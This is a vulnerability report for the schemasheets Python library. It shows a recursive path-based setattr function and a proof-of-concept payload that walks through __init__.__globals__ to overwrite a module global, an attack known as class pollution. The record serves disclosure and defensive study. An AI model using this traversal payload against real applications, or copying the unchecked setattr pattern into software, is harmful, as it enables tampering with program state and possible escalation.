## schemasheets

### Meta

+ Library: schemasheets
+ Stars: 44
+ Version: 0.3.1
+ CVE: N/A
+ Status: Pending
+ Payload: ```set_attr_via_path_accessor(obj, ["__init__", "__globals__", "__name__"], 'polluted')```
+ Foundby: Zhong
+ Report: Pending
+ Type: CLI
+ Exploitability: Low
+ Input: Local

### Library

https://github.com/linkml/schemasheets

### Vulnerable Code Snippet

```python
def set_attr_via_path_accessor(obj: Union[dict], path: Union[str, List[str]], value: Any, depth=0) -> None:
    toks = ensure_path_tokens(path)
    tok = toks[0]
    toks = toks[1:]
    logging.debug(f"[{depth}] Setting attr {tok} / {toks} in {obj} to {value}")
    if isinstance(obj, dict):
        if not toks:
            obj[tok] = value
        else:
            if tok not in obj:
                obj[tok] = {}
                logging.info(f"Creating empty dict for: {tok}")
            set_attr_via_path_accessor(obj[tok], toks, value, depth+1)
    else:
        if not toks:
            setattr(obj, tok, value)
        else:
            if not hasattr(obj, tok):
                setattr(obj, tok, {})
            set_attr_via_path_accessor(getattr(obj, tok), toks, value, depth+1)
```
### PoC

```python
import random
import logging
from typing import Union, List, Any

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)
      

obj = Animal('cat', 11)
addr = ["__init__", "__globals__", "__name__"]
set_attr_via_path_accessor(obj, addr, 'polluted')

print(__name__)
```